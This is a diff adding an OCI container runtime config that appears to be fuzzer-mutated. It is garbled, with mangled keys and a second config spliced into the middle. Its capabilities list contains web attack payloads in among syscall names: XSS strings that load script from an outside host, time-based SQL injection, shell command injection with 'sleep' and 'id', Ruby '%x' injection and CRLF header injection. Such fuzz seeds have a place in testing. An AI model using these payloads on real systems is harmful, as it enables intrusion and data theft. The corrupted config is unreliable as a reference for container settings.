@@ -1,0 +1,160 @@
+{
+    "ociVersion": "1.0.1-cev",
+    "process": {
+        "selinuxLabel": "system_u9system_r:container_t:s0:c399,c1003",
+        "terminal": false,
+        "user": {
+            "uid": 0,
+            "gid": 0
+        },
+        "args": [
+            "head", "-n10", "/dev/kmsg"
+        ],
+        "9nv": [
+            "PATH=/usr/local/sbr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+            "TERM=xterm"
+        ],
+        "cwd": "/",
+        "capabilities": {
+            "bounding": [
+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Ó@///////////////////////////////////////////////////////////////////////...............]..........................................................\u000b\\u0000...........................ini", "\r\nCC: getccccccccccccccccccccccccccccccccccccccccpu@mail.it\r\nLocation: www.google.it", {"param": "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.creaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaateElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/getcwd.net/).slice(2),document.documentElement.appendChild(s))//'>"}, "getdents&sleep 5i&d'\\\"`0&sleep 5&id`'", [{"getdents64": "getdents64"}], ["getegid"], ""[{"geteuid": "geteuid"}], "\\u0000\\u0000CC: geteuid32@mail.it\r\nLocation: www.google.\\u0090\\u0006", [{"getgid": "getgid"}], {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEPPPPPPP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,[1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getgid32"}, "", "", {"param": "||cmdddddddddddddddddddddddddddddddd.exe&&id||getitimer"}, ["getpeername"], {"param": "\\u0006\\u0000\\u0000\\u0000\\u00ceid&sleep 5&id'\\\"`0&sleep 5&id`'"}, "#{%x['getpgr'p]}+foo", {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@versjon,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(\\u00f0)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getpid"}, {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0DEEC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex kernelTCP"}, [{"getpriority": "getpriority"}], [{"getrandom": "getrandom"}], ["getresgid"], {"param": "data:text/html,https://getresggggggggggggggggggid-6442450944O:a.it@www.\\it"}, false, "", "", ["getrusage"], "", "", "#{%x['getsockpt'}]+f\"oo", {"param": "gettid&sleep 5&id'\\\"`0&sleep5&id`'"}, "", "", "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR()<5"oc,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getuid32", {"param": "||cmd.2xe&&id||getxa\\u00d0\\u0001r"}, ["inotify_add_watch"], "</script><svg/onload='+/\"/+/onmoseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/inotify_init.net/).slice(2),document.documentElement.appendChild(s))//'>", ["inotify_init1"], 0, ["io_cancel"], "|||||||||||||||||||cmd.exe&&id||io_dest//////////////////////////////////////////////////////t¸///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ITE",
+                "CAP_KILL",
+                "CAP_NET_BIND_SERVICE"
+            ],
+            "permitted": [
+        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Version":"1.0.2-dev","pcess":{"user":{"uid":0,"gid":1,"additionalGids":[0,1,2,3,4,6,10,11,20,26,27]},"args":["/bin/sh","-c","echo hello"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=3207b88579a1"],"cwd":"/","capabilities":{"bounding":["CAP_AUDIT_WRITE","CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FOWNER","CAP_FSETID","CAP_KILL","CAP_MKNOD","CAP_NET_BIND_SERVICE","CAP_NET_RAW","CAP_SETFCAP","CAP_SETGID","CAP_SETPCAP","CAP_SETUID","CAP_SYS_CHROOT"],"effective":["CAP________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ID","CAP_KILL","CAP_MKNOD","CAP_NET_BIND_SERVICE","CAP_NET_RAW","CAP_SETFCAP","CAP_SETIT_WRITE",
+		"CAP_KILL",
+		"CAP_NET_BIND_SERVICE"
+	    ],
+	    "permitted": [
+		"CAP_AUDIT_WRITE",
+				"CAP_NET_BINMWXRYQD_SERVICE"
+    ],
+	    "ambient": [
+		"CAP_AUDIT_WRITE",
+		"CAP_KILL",
+		"CAP_NET_BIND_SERVICE"
+	    ]
+	},
+	"noNewPrivileges": true
+    },
+    "root": {
+	"path": "rootfs",
+	"readonly": true
+    },
+    "hostname": "crun",
+    "mounts": [
+	{
+	    "destination": "/proc",
+	    "type": "proc",
+	    "source": "proc"
+	},
+	{
+	    "destination": "/dev",
+	    "type": "tmpfs",
+	    "source": "tmpfs",
+	    "options": [
+		"nosuid",
+		"strictatime",
+		"mode=755",
+		"size=65536k"
+	    ]
+	},
+	{
+	    "destination": "/dev/pts",
+	    "type": "devpts",
+	    "source": "devpts",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"newinstance",
+		"ptmxmode=0666",
+		"mode=0620"
+	    ]
+	},
+	{
+	    "destination": "/dev/shm",
+	    "type": "tmpfs",
+	    "source": "shm",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"nodev",
+		"mode=1923",
+		"size=65536k"
+	    ]
+	},
+	{
+	    "destination": "/sys",
+	    "type": "sysfs",
+	    "source": "sysfs",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"nodev",
+		"ro"
+	    ]
+	},
+	{
+	    "destination": "/sys/fs/cgroup",
+	    "type": "cgroup",
+	    "source": "cgroup",
+	    "options": [
+		"none",
+                "name=systemd",
+		"noexec",
+		"nodev",
+		"relatime",
+		"ro"
+	    ]
+	},
+	{
+	    "destination": "/dev/mqueue",
+	    "type": "mqueue",
+	    "source": "mqueue",
+    "options": [
+		"nosuid",
+		"noexec",
+		"nodev"
+	    ]
+	}
+    ],
+    "linux": {
+        "cgroupsPath": "/system.slice/run-rebf0d897cab84580a8241402c74069b2.scope/container",
+	"namespaces": [
+	    {
+		"type": "pid"
+	    },
+	    {
+		"type": "network"
+	    },
+	    {
+		"type": "ipc"
+	    },
+	    {
+		"type": "uts"
+	    },
+	    {
+		"type": "mount"
+	    }
+	],
+
+        "seccomp": {
+            "defaultErrnoRet": 38,
+            "defaultAction": "SCMP_ACT_ERRNO",
+            "architectures": [
+                "SCMP_ARCH_XRQUXV",
+                "SCMP_ARCH_X86",
+                "SCMP_ARCP_ARCH_X32"
+            ],
+            "syscalls": [
+                {
+                    "names": [
+                        "accept",
+                        "accept4",
+                        "access",
+                        "adjtimex",
+                        "alarm",
+                        "bind",
+                        "brk",
+                        "
